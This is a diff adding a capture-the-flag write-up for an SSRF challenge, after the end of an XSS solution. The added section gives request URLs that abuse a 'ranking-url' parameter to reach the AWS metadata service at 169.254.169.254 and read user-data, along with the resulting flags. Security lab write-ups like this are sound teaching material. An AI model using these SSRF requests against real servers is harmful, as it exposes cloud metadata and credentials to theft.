@@ -192,3 +192,27 @@ We visit the URL in our Burp request we used to include script.js in the browser
 PHPSESSID=WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
 ``````
 Flag: WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
+
+# GovTech SecTech (5/6) - SSRF
+
+### Solution
+SSRF is a vulnerability in which I can get my target server to perform requests for me. It is commonly found in functionality which allows for embedding of images, PDF generators, and much more. It is particularly dangerous as I can use this to bypass firewalls and even perform remote code execution (eg. Redis). This is not only limited to HTTP requests, we could also solve the LFI challenge with an SSRF too!
+
+On the 'Rankings' page, we notice that we can control the URL - http://sec-tech.cf/rankings.php?ranking-url=http://localhost/university-rankings.html
+
+We can use SSRF to query sensitive information about AWS servers from AWS metadata.
+
+If we query  http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/
+``````
+Output: 
+dynamic meta-data user-data 
+``````
+We can query http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/user-data to receive flag!
+``````
+Output: 
+WH2020{EC2UserData-SSRF} 
+``````
+Flag: WH2020{EC2UserData-SSRF} 
+
+
+
